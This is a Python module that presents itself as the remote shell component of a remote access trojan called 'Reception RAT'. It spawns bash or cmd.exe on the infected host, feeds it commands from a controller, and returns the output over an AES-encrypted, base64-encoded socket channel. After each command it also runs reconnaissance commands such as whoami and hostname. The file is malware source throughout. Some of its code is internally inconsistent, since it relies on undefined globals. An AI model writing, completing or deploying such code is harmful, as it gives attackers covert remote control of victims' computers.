'''
REMOTE SHELL
VERSION : 1.0.0
AUTHOR : ISSAC

THIS IS THE REMOTE SHELL SCRIPT OF THE RECEPTION RAT

'''

import subprocess
import base64
import threading
import time

class Shell:
    '''
    INITIALIZATION
    '''
    def __init__(self, sock) -> None:
        self.sock = sock
        self.start = False
        self.init_cd = False
        self.command = shell[1]
        self.proc = None
        self.ShellEncoding = 'big5' # TERMINAL ENCODING

    '''
    SEND OUTPUT (STDOUT/STDERR)
    '''
    def send_output(self, out:bytes):
        line = out.decode(self.ShellEncoding).replace('\n', '')
        if line == shell[2]:
            return

        out = out.decode(self.ShellEncoding).encode('utf-8') # CONVERT OUTPUT FROM GIVEN ENCODING TO UTF-8
        line_b64 = base64.b64encode(out).decode('utf-8')

        payload = f'{line_b64}|'
        payload = f'Shell|{payload}'

        buffer = base64.b64encode(payload.encode('utf-8')).decode()
        sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))

    '''
    READ STANDARD OUTPUT
    '''
    def read_stdout(self):
        while True:
            line = self.proc.stdout.readline()
            if line:
                self.send_output(line)

    '''
    READ STANDARD ERROR
    '''
    def read_stderr(self):
        while True:
            line = self.proc.stderr.readline()
            if line:
                self.send_output(line)

    '''
    WRITE SHELL COMMAND INTO STANDARD INPUT
    '''
    def write_stdin(self):
        self.command = None

        self.proc.stdin.write(b'\n')
        self.proc.stdin.flush()

        while True:
            if self.command != None and self.command != '\r':
                print(self.command)
                self.proc.stdin.write(self.command.encode() + b"\n")
                self.proc.stdin.flush()

                #self.proc.stdin.write(b'\n')
                #self.proc.stdin.flush()

                self.command = None

                if unix_like():
                    self.proc.stdin.write('whoami;echo $("hostname");pwd\n')
                    self.proc.stdin.flush()

    '''
    CHECK IF SUBPROCESS (SHELL) EXIT
    '''
    def wait_exit(self):
        self.proc.wait()
        self.proc.stdin.close()
        print('exit')

    def run(self):
        if self.start:
            self.command = shell[1]
        else:
            _exec = '/bin/bash' if unix_like() else 'cmd.exe'
            self.proc = subprocess.Popen(_exec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            self.start = True
            func_list = [
                self.write_stdin,
                self.read_stdout,
                self.read_stderr,
                self.wait_exit,
            ]

            for func in func_list:
                threading.Thread(target=func).start()